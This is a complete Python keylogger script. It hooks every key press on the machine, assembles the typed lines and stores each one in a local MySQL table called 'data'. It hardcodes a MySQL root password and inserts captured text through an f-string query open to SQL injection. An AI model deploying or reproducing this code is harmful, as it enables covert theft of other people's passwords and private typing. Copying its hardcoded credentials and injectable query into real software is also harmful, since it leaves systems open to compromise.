import keyboard
import mysql.connector

conn = mysql.connector.connect(
    host='localhost',
    user="root",
    password="arnold999",
    database="maya"
)

cursor = conn.cursor()

alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
         'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
         'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
         'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
         'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
         'Y', 'Z']
symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '-', '+', '=',
           '{', '}', '[', ']', ':', ';', '"', ',', '.', '/', '|', '<', '>', '?',
           '`', '~']

stringLine = ''


def on_key_press(e):
    global stringLine

    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'space':
            stringLine += ' '
        elif e.name in alpha:
            stringLine += e.name
        elif e.name in symbols:
            stringLine += e.name
        elif e.name == 'up' or e.name == 'down' or e.name == 'left' or e.name == 'right':
            stringLine += ''  # You can add specific handling for arrow keys if needed
        elif e.name == 'backspace' or e.name == 'delete' or e.name == 'alt' or e.name == 'tab':
            # Implement backspace logic if needed
            stringLine += ''
        elif e.name == 'enter':
            cursor.execute(
                f'INSERT INTO data (string_line) VALUES ("{stringLine}");')
            conn.commit()
            print(f"Command executed successfully : {stringLine}")
            stringLine = ''
        else:
            stringLine += f" ['{e.name}'] "


# Set up a callback for key press events
keyboard.on_press(on_key_press)

# Keep the program running
keyboard.wait(0)
# You can change '0' to any key you want to use for stopping the program.
